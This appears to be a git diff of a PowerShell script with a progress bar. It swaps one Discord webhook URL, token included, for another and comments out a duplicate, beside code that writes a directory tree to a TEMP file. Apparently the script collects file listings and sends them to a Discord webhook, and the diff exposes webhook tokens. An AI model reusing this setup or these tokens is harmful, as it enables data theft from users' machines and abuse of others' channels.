@@ -1,7 +1,7 @@
 # Script with 5 operations with progress bar
 
 # Discord webhook URL
-$webhookUrl = 'https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+$webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
 
 # ##############################################################################
 
@@ -236,7 +236,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             #########################################################################
     
             # Define the webhook URL
-            $webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+            # $webhookUrl='https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
     
             # Define the path to the text file using the TEMP environment variable
             $filePath = "$env:TEMP\tree.txt"
